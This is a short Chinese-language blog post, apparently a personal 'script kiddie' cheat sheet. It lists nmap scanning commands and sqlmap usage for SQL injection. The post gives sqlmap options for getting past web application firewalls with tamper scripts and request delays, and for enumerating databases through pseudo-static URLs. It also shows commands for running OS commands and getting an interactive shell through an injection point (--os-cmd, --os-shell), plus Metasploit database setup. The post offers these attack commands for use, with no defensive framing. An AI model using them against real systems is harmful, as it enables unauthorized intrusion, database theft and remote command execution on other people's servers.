
---
title: "SQL注入"
date: 2018-7-4 12:52:31
categories: SQL注入
tags: 
	- SQL注入
---

**脚本小子之路,嘻嘻嘻**
<!-- more -->


## 0X00 扫描C段,和端口服务信息

>  nmap -sV -sT -Pn --open -v 地址或者IP

## 0X01 简单扫描端口服务信息

>  nmap -sV 地址或者IP

## 0X02 检查是否存在常见漏洞

>  nmap --script=vuln 地址或者IP

## 0X03 sqlmap默认配置

> --batch 从不询问用户输入，使用所有默认配置。

## 0X04 sqlmap绕过WAF

> -v 3 --dbs --batch --tamper "space2morehash.py"

 - space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py 都是编码方式

 - space2hash.py base64encode.py charencode.py

  
## 0X05 SQLMAP伪静态注入(1) 查找数据库

> -u "http://xxx.cn/index.php/Index/view/id/40.html" --dbs

## 0X06 SQLMAP注入点执行命令与交互写shell 

- 此处采用的是Linux系统

> sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-cmd=ipconfig

- **获取shell**

> sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-shell

## 0X07 判断网站是否为伪静态

> javascript:alert(document.lastModified)

- 1.弹出的时间和当前时间一样就是静态
- 2.弹出时间和当前时间不一样说明为伪静态

## 0X08 MSF连接数据库启用缓存系统

> 1. service postgresql start 开启数据库服务
> 2. 进入MSF过后,输入db_status查看连接状态
> 3. 重启MSF

## 0X09 sqlmapHTTP请求延迟避免WAF

> --delay  每次http(s)请求之间延迟时间，浮点数，单位为妙，默认无延迟，输入此参数，你会发现每个请求都会延迟3秒，当然数据库还是可以爆出来的。
